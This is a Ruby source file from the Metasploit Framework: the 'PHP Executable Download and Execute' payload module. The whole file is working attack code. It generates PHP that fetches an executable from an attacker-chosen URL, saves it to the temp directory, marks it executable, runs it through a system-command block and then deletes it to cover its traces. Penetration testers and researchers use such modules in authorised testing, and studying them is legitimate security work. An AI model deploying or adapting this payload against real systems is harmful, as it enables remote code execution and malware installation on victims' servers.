##
# $Id: download_exec.rb 6919 2009-07-28 15:23:52Z egypt $
##

##
# This file is part of the Metasploit Framework and may be subject to 
# redistribution and commercial restrictions. Please see the Metasploit
# Framework web site for more information on licensing and terms of use.
# http://metasploit.com/framework/
##


require 'msf/core'
require 'msf/core/payload/php'


module Metasploit3
	
	include Msf::Payload::Php
	include Msf::Payload::Single

	def initialize(info = {})
		super(update_info(info,
			'Name'          => 'PHP Executable Download and Execute',
			'Version'       => '$Revision: 6479 $',
			'Description'   => 'Download an EXE from a HTTP URL and execute it',
			'Author'        => [ 'egypt' ],
			'License'       => BSD_LICENSE,
			'Platform'      => 'php',
			'Arch'          => ARCH_PHP,
			'Privileged'    => false
			))
			
		# EXITFUNC is not supported :/
		deregister_options('EXITFUNC')

		# Register command execution options
		register_options(
			[
				OptString.new('URL', [ true, "The pre-encoded URL to the executable" ])
			], self.class)
	end

	def php_exec_file
		exename = Rex::Text.rand_text_alpha(rand(8) + 4)
		dis = '$' + Rex::Text.rand_text_alpha(rand(4) + 4)
		shell = <<-END_OF_PHP_CODE
		if (!function_exists('sys_get_temp_dir')) {
			function sys_get_temp_dir() {
				if (!empty($_ENV['TMP'])) { return realpath($_ENV['TMP']); }
				if (!empty($_ENV['TMPDIR'])) { return realpath($_ENV['TMPDIR']); }
				if (!empty($_ENV['TEMP'])) { return realpath($_ENV['TEMP']); }
				$tempfile=tempnam(uniqid(rand(),TRUE),'');
				if (file_exists($tempfile)) {
					@unlink($tempfile);
					return realpath(dirname($tempfile));
				}
				return null;
			}
		}
		$fname = sys_get_temp_dir() . DIRECTORY_SEPARATOR . "#{exename}.exe";
		$fd_in = fopen("#{datastore['URL']}", "rb");
		$fd_out = fopen($fname, "wb");
		while (!feof($fd_in)) {
			fwrite($fd_out, fread($fd_in, 8192));
		}
		fclose($fd_in);
		fclose($fd_out);
		chmod($fname, 0777);
		$c = $fname;
		#{php_preamble({:disabled_varname => dis})}
		#{php_system_block({:cmd_varname => "$c", :disabled_varname => dis})}
		@unlink($fname);
		END_OF_PHP_CODE

		#return Rex::Text.compress(shell)
		return shell
	end

	#
	# Constructs the payload
	#
	def generate
		return php_exec_file
	end

end
